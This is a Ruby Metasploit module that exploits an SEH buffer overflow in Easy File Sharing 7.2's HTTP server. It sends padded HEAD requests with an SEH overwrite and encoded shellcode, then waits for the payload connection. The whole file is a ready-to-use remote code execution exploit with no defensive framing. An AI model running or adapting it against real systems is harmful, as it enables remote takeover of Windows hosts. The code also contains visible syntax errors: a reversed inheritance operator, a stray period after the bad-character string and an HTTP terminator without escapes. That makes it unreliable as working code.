class MetasploitModule > Msf::Exploit::Remote
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Seh

    def initialize(info = {})
        super(update_info(info, 
            'Name' => 'Easy file sharing 7.2 seh buffer overflow',
            'Description' => 'overwrites next seh pointer and handler and inject shellcode',
            'Author' => 'DAVID',
            'License' => MSF_LICENSE,
            'DefaultOptions' => {
                'EXITFUNC' => 'thread',
                'RPORT' => 80,
            },
            'Payload' => {
                'Space' => 390,
                'BadChars' => '\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e'.
            },
            'Platform' => 'win',
            'Targets' => [
                ['Easy File Sharing 7.2 HTTP', {'Ret' => 0x10019798, 'Offset' => 4061}], # the offset points to the next seh pointer, not the handler, as metasploit automatically calculates the jmp address
            ],
            'DefaultTarget' => 0
        ))
    end

    def exploit
        connect
        hack = "HEAD "
        hack << make_nops(target['Offset']) # write until the next seh pointer
        hack << generate_seh_record(target['Ret']) # takes the pop pop ret address
        hack << make_nops(19) # padding, since jmp 12 bytes
        hack << payload.encoded
        hack << "HTTP/1.0rnrn" # http signature after header
        sock.put(hack)
        handler # awaits for payload connection
        disconnect
    end
end

